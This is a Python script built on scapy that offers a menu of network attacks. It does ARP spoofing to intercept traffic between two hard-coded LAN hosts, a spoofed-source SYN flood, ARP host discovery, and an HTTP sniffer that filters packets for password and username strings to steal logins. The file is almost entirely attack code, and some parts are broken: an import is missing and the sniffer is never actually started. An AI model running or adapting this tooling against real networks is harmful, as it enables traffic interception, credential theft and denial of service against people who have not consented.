#!/usr/bin/env python

import scapy.all as scapy  # arp SPOOFING MITM attack
from scapy.layers import http
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
from scapy.layers.inet import TCP, IP
import argparse
from scapy.layers import http


def main():
    print("Please choose the options to run the attacking script program: \n"
          "1: ARP Spoof attack\n"
          "2: TCP Syn Flooding Attack\n"
          "3: Network Scanning\n"
          "4: Sniff Packets\n"
          "\nPlease Ctrl C to exit out of script")
    switch = input("\nPlease enter the number: ")

    if switch == "1":
        def getting_mac(ip):
            req_arp = scapy.ARP(pdst=ip)
            broadcastmac = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # set dst mac as broadcast mac
            broadcast_arp_req = broadcastmac / req_arp
            answering_list = scapy.srp(broadcast_arp_req, timeout=1, verbose=False)[0]

            return answering_list[0][1].hwsrc  # first element, access the first IP, access element mac using hwsrc, return the MAC address of the IP we give

        def spoofarp(target_ip, spoofed_ip):
            target_mac = getting_mac(target_ip)
            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                               psrc=spoofed_ip)  # fooling target that it is the router #hwdst is mac address and psrc is target IP
            scapy.send(packet, verbose=False)

        def arp_spoof(target_ip: str, spoofed_ip: str):
            spoofarp(target_ip, spoofed_ip)
            spoofarp(spoofed_ip, target_ip)

        if __name__ == '__main__':
            while (True):
                arp_spoof("192.168.1.134", "192.168.1.105")
        # spoofarp("10.0.2.15", "10.0.2.2")# tell the computer i am the router
        # spoofarp("10.0.2.2", "10.0.2.15")# tell the router i am the victim
        # #IP of the target computer, pdst and hwdst is mac address of target machine
        # #source IP psrc (ip of router) op sent as a arp response
    elif switch == "2":
        def syncflooding(srcip, tgtip):
            for sourceport in range(1024, 65535):
                layer3 = IP(src=srcip, dst=tgtip)
                layer4 = TCP(sport=sourceport, dport=1337)
                packet = layer3 / layer4
                send(packet)

        src = "10.0.3.2"
        dst = "10.0.2.2"

        syncflooding(src, dst)

    elif switch == "3":
        def get_arguments():
            parser = argparse.ArgumentParser()
            parser.add_argument("-t", "--target", dest="target", help="targeted IP / IP range")
            (options) = parser.parse_args()
            return options

        def scan(ip):
            req_arp = scapy.ARP(pdst=ip)
            broadcastmac = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # set dst mac as broadcast mac
            broadcast_arp_req = broadcastmac / req_arp  # sending arp broadcast and ARP request to automatically to go to broadcast msg
            answering_ip_list = scapy.srp(broadcast_arp_req, timeout=1, verbose=False)[
                0]  # srp is allows sending packets with custom parts, and receive response
            # time out wait the number of seconds, then move on. If not you will get stuck of the program. Telling me to get element 0
            print("IP\t\t\tMAC address\n----------------")
            clients_list = []  # empty list create new variable
            for element in answering_ip_list:  # list contains useful info of all the answered ip
                # create dictionary
                client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}  # getting the ip and mac address
                clients_list.append(client_dict)
                print(element[1].psrc + "\t\t" + element[1].hwsrc)
            return clients_list

        def print_result(results_list):
            print("IP\t\t\tMAC address\n----------------")
            for client in results_list:  # should get the dicts, keys and values
                print(client["ip"] + "\t\t" + client["mac"])

        options = get_arguments()
        scan_result = scan(options.target)
        print_result(scan_result)

    elif switch == "4":

        def sniffer(interface):
            scapy.sniff(iface=interface, store=False,
                        prn=execute_sniffed_packet)  # tells scapy not to store packets in memory (store)
            # PRN specifies callback function, function is called everytime a packet is captured
            # filter looking for packets sent over UDP, FTP, port 21, anything that you want

        def capturing_url(packetcaptured):
            return packetcaptured[http.HTTPRequest].Host + packetcaptured[http.HTTPRequest].Path

        def gettinguserinfologin(packetcaptured):
            if packetcaptured.haslayer(scapy.Raw):
                loaded = str(packetcaptured[scapy.Raw].loaded)
                addingkwfields = ["usernames", "password", "pass"]
                for kw in addingkwfields:
                    if kw in loaded:
                        return loaded

        def execute_sniffed_packet(packetcaptured):
            if packetcaptured.haslayer(http.HTTPRequest):
                url = capturing_url(packetcaptured)
                print("[+] Using HTTP Request >> " + str(url))

                user_info_login = gettinguserinfologin(packetcaptured)
                if user_info_login:
                    print("\n\n[+]  " + user_info_login.decode + "\n\n")

        sniffer = ("eth0")


main()
